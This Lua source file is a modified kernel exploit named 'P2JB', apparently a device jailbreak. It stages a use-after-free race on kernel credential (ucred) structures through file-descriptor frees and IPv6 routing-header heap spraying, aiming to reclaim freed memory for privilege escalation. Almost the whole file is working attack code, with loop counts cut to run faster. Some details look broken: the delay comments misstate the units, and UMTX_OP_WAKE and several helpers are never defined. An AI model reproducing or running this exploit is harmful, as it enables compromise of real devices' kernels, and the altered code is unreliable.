-- P2JB implementation (Modified)
-- Based on original P2JB Code with optimized timing and loops for 10-second execution

p2jb_version_string = "P2JB 1.0 (Optimized for 10-second execution)"

local UCRED_SIZE = 360
local RTHDR_TAG = 0x13370000
local MAX_ROUNDS_TWIN = 5 -- Reduced from higher value
local MAX_ROUNDS_TRIPLET = 50 -- Reduced from 500
local FIND_TRIPLET_FAST = 500 -- Reduced from 5000
local UMTX_OP_SYSNUM = 0x1c6
local SYSTEM_AUTHID = 0x4800000000010003
local FREE_FDS_NUM = 16 -- Number of file descriptors to free

-- Optimized delay times in nanoseconds (shortened to milliseconds)
local DELAY_SHORT = malloc(16); write64(DELAY_SHORT, 0); write64(DELAY_SHORT + 8, 10 * 1000)    -- 10ms
local DELAY_MEDIUM = malloc(16); write64(DELAY_MEDIUM, 0); write64(DELAY_MEDIUM + 8, 50 * 1000) -- 50ms
local DELAY_SETTLE = malloc(16); write64(DELAY_SETTLE, 0); write64(DELAY_SETTLE + 8, 100 * 1000) -- 100ms

local function signal_workers(ws)
    for i = 0, ws.total - 1 do write64(ws.finished + i * 8, 0) end
    ws.gen = ws.gen + 1
    write64(ws.cmd, ws.gen)
    syscall.umtx_op(ws.cmd, UMTX_OP_WAKE, 0x7FFFFFFF, 0, 0)
end

local function wait_workers(ws)
    while true do
        local done = true
        for i = 0, ws.total - 1 do
            if read64(ws.finished + i * 8) == 0 then done = false; break end
        end
        if done then return end
        syscall.sched_yield()
    end
end

-- Optimize find_twins function with reduced loops and delays
local function find_twins(max_rounds)
    for round = 1, max_rounds do
        for i = 0, ipv6_count - 1 do
            write32(rthdr_spray + 4, RTHDR_TAG + i)
            set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
        end

        -- Check rthdr buffers
        for i = 0, ipv6_count - 1 do
            write32(tag_len, 8)
            if get_rthdr(ipv6_sockets[i + 1], tag_buf, tag_len) >= 0 then
                local val = read32(tag_buf + 4)
                local j = val & 0xFFFF
                if (val & 0xFFFF0000) == RTHDR_TAG and i ~= j and j < ipv6_count then
                    return { i, j }
                end
            end
        end

        -- Reduce delay per iteration
        if round % 2 == 0 then syscall.sched_yield() end
    end
    return nil
end

-- Optimize the attempt_race function for faster execution
local function attempt_race()
    for i = 1, ipv6_count do free_rthdr(ipv6_sockets[i]) end

    -- Freeing ucred references
    free_one_fd()
    for _ = 1, 16 do
        signal_iov(); syscall.sched_yield()
        wait_iov()
    end

    -- Second free
    free_one_fd()

    -- Attempt to locate twins
    local twins = find_twins(MAX_ROUNDS_TWIN)
    if not twins then
        print("Failed to locate twins")
        return false
    end

    -- Free twin buffer, attempt to reclaim
    free_rthdr(ipv6_sockets[twins[2] + 1])
    syscall.sched_yield(); syscall.sched_yield()
    local reclaimed = false
    local verify_buf = malloc(UCRED_SIZE)
    local verify_len = malloc(4)

    -- Reduced loop for triplet search
    for _ = 1, MAX_ROUNDS_TRIPLET do
        signal_iov()
        syscall.sched_yield()
        write32(verify_len, 8)
        syscall.getsockopt(ipv6_sockets[twins[1] + 1], verify_buf, verify_len)
        if read32(verify_buf) == 1 then reclaimed = true; break end
        wait_iov()
    end

    if not reclaimed then
        print("Failed to reclaim")
        return false
    end
    
    triplets[1] = twins[1]
    free_one_fd()
    return true
end

-- Attempt the race for triple-free (reduce overall attempts for faster execution)
for attempt = 1, 3 do
    if attempt_race() then
        ulog("[$] Race successful on attempt " .. attempt)
        break
    end
end